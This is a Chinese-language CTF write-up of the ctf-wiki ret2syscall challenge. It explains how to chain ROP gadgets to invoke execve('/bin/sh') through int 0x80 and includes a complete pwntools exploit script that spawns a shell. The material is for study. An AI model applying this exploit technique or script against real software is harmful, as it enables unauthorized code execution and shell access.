### 知识

- [[Linux x86 系统调用]]
- [[如何编写 shellcode]]

### 例题

ctf-wiki 的 ret2syscall。

反编译程序，发现没有 RWX 段，也没有后门函数，考虑系统调用获取 shell。

```powershell
NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename， char *const argv[]，
                  char *const envp[]);
```

由函数原型可知，应该把 execve 构造为：`execve('/bin/sh'， 0， 0)` 的格式。

也就是说：

- 先往 eax 里传入 execve 的系统调用号，调用 execve 函数；
- 向 ebx 中传入 `/bin/sh` ，向 ecx 中传入 `0 `，向 edx 中传入 `0`；
- 再触发 0x80 号中断（int 0x80）即可。

即构造如下栈帧：

![](https://pic.imgdb.cn/item/638a189d16f2c2beb1845272.jpg)

具体的 pop_edx_ecx_ebx_ret 的获取，可以用 ROPgadget 实现。

#### exp

```python
from os import execve
from pwn import *

proc = './ret2syscall'
context.binary = (proc)
context.log_level = 'debug'
io = process('./ret2syscall')

exec = 0xb
offset = 112
bin_sh = 0x080be408
pop_eax = 0x080bb196
pop_ecx_ebx = 0x0806eb91
pop_edx = 0x0806eb6a
pop_edx_ecx_ebx = 0x0806eb90
int_0x80 = 0x08049421

# 两种构造方式
payload1 = b'a' * offset + p32(pop_eax) + p32(exec) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)
payload2 = b'a' * offset + p32(pop_eax) + p32(exec) + p32(pop_edx) + p32(0) + p32(pop_ecx_ebx) + p32(0) + p32(bin_sh) + p32(int_0x80)

io.recvuntil("What do you plan to do?")
io.sendline(payload2)

io.interactive()
```

